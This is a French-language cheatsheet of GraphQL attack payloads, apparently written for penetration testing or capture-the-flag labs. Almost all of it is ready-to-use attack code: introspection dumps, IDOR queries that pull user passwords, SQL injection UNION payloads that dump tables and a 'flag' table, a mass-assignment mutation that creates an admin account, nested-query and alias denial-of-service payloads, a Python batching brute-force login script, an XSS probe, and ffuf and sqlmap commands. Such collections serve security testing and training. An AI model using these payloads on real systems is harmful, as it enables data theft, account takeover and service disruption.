---
titre: "GraphQL — Payloads & cheatsheet"
tags: [Failles, GraphQL]
---

# GraphQL — Payloads & cheatsheet

> ⬅ [[GraphQL - Index]]

Lié : GraphQL · GraphQL · [[Outils GraphQL]]

---

## 1. Sonde de base (confirmer GraphQL)

```graphql
{ __typename }
```
Réponse attendue : `{"data":{"__typename":"Query"}}` → c'est du GraphQL.

---

## 2. Requêtes d'introspection

### Lister tous les types
```graphql
{ __schema { types { name } } }
```

### Lister les queries + arguments
```graphql
{ __schema { queryType { fields { name description args { name type { name kind } } } } } }
```

### Lister les mutations + inputs
```graphql
{ __schema { mutationType { fields { name args { name type { name kind ofType { name } } } } } } }
```

### Détailler un type (champs)
```graphql
{ __type(name: "UserObject") { name fields { name type { name kind } } } }
```

### Détailler un input type (attention : inputFields)
```graphql
{ __type(name: "RegisterUserInput") { inputFields { name description defaultValue type { name kind } } } }
```

### Introspection TOTALE (dump complet du schéma)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType { kind name }
            }
          }
        }
      }
    }
  }
}
```

→ Coller le JSON de réponse dans **GraphQL Voyager** pour visualiser.

---

## 3. Payloads IDOR

### IDOR direct
```graphql
{ user(username: "admin") { username password role } }
```

### IDOR par sous-requête
```graphql
{ posts { title author { username password } } }
```

### IDOR par Global ID (Relay)
```bash
echo -n "UserObject:2" | base64    # → VXNlck9iamVjdDoy
```
```graphql
{ node(id: "VXNlck9iamVjdDoy") { ... on UserObject { username password } } }
```

---

## 4. Payloads SQLi

### Confirmer l'injection
```graphql
{ user(username: "test'") { username } }
```
```graphql
{ user(username: "test' -- -") { username } }
```

### UNION — dumper les tables
```graphql
{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database() -- -") { username } }
```

### UNION — dumper les colonnes
```graphql
{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_schema=database() AND table_name='flag' -- -") { username } }
```

### UNION — exfiltrer les données
```graphql
{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag -- -") { username } }
```

### Version JSON/curl (avec échappement)
```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<cookie>" \
  -d '{"query":"{ user(username: \"x'\'' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database() -- -\") { username } }"}' | jq
```

---

## 5. Payloads mutations

### Créer un utilisateur
```graphql
mutation {
  registerUser(input: {
    username: "hacker",
    password: "5f4dcc3b5aa765d61d8327deb882cf99",
    role: "user",
    msg: "test"
  }) {
    user { username role }
  }
}
```

### Escalade de privilèges (mass assignment)
```graphql
mutation {
  registerUser(input: {
    username: "hackerAdmin",
    password: "5f4dcc3b5aa765d61d8327deb882cf99",
    role: "admin",
    msg: "Hacked!"
  }) {
    user { username role }
  }
}
```

### Hasher un mot de passe (MD5)
```bash
echo -n 'MonMotDePasse' | md5sum
# ⚠️ -n obligatoire (pas de \n)
```

---

## 6. Payloads DoS

### Nested query DoS (Python)
```python
def nested_dos(depth):
    inner = "author { username }"
    block = "author { posts { edges { node { %s } } } }"
    q = inner
    for _ in range(depth):
        q = block % q
    return "{ posts { %s } }" % q

print(nested_dos(10))
```

### Alias overloading
```graphql
{
  a: user(username: "admin") { password }
  b: user(username: "test")  { password }
  c: user(username: "root")  { password }
}
```

---

## 7. Batching

```json
[
  {"query":"{ user(username: \"admin\") { uuid } }"},
  {"query":"{ post(id: 1) { title } }"},
  {"query":"{ user(username: \"test\") { password } }"}
]
```

### Batching brute-force
```python
import json, requests

url = "http://<TARGET>/graphql"
passwords = ["password", "admin", "123456", "letmein"]
batch = [
    {"query": f'{{ login(user:"admin", password:"{p}") {{ token }} }}'}
    for p in passwords
]
r = requests.post(url, json=batch)
for i, res in enumerate(r.json()):
    if "token" in str(res.get("data", {})):
        print(f"[+] Found: {passwords[i]}")
```

---

## 8. XSS via erreur

```graphql
{ post(id: "<script>alert(1)</script>") { title } }
```
→ Si le message d'erreur est reflété dans le HTML sans encodage.

---

## 9. Commandes utilitaires

### Décoder un Global ID Relay
```bash
echo "VXNlck9iamVjdDox" | base64 -d
# → UserObject:1
```

### Forger un Global ID
```bash
echo -n "SecretObject:2" | base64
# → U2VjcmV0T2JqZWN0OjI=
```

### Découverte d'endpoint (ffuf)
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
     -u http://<TARGET>/FUZZ \
     -X POST -H "Content-Type: application/json" \
     -d '{"query":"{__typename}"}' \
     -mr "__typename|data|errors"
```

### sqlmap sur GraphQL
```bash
# Marquer le point d'injection avec * dans le fichier Burp
sqlmap -r req.txt --batch --dump
```

### GraphQL-Cop (audit rapide)
```bash
python3 /opt/graphql-cop/graphql-cop.py -t http://<TARGET>/graphql
```
